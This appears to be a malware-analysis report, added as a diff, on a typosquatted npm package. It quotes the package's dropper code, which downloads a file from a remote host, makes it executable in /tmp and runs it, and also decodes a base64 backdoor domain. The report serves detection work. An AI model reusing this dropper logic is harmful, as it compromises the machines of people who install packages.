@@ -1,0 +1,43 @@
+{
+  "package_metadata": {
+    "name": "http-proxy-middelware",
+    "version": "2.9.0"
+  },
+  "behavior_analysis": {
+    "file_operations": [
+      "fs.createWriteStream('/tmp/glomus')",
+      "fs.chmod('/tmp/glomus', '0777')"
+    ],
+    "network_activity": [
+      "http.get('http://' + remold + '/broomrape')",
+      "dns.lookup((new Buffer(zincuret, 'base64')).toString())"
+    ],
+    "process_actions": [
+      "child_process.exec('/tmp/glomus')"
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "index.js",
+        "code_snippet": "var neroli = fs.createWriteStream('/tmp/glomus'); flemished.on('data', function(tollman) { neroli.write(tollman); }); flemished.on('end', function() { neroli.end(); fs.chmod('/tmp/glomus', '0777'); child_process.exec('/tmp/glomus', function(err, stdout, stderr) {}); });"
+      },
+      {
+        "filename": "index.js",
+        "code_snippet": "zincuret = 'ZDhhNTYxMGUuZ3JheXlsei5kZQ==' dns.lookup((new Buffer(zincuret, 'base64')).toString(), function(err, throbless) { self.run_backdoor(throbless); });"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.85,
+    "risk_score": 0.9,
+    "confidence": 0.95,
+    "indicators": [
+      "Base64-encoded strings with high entropy",
+      "DNS over HTTPS/TLS anomalies",
+      "File system writes",
+      "Child process execution",
+      "HTTP requests to unusual domains"
+    ]
+  }
+}
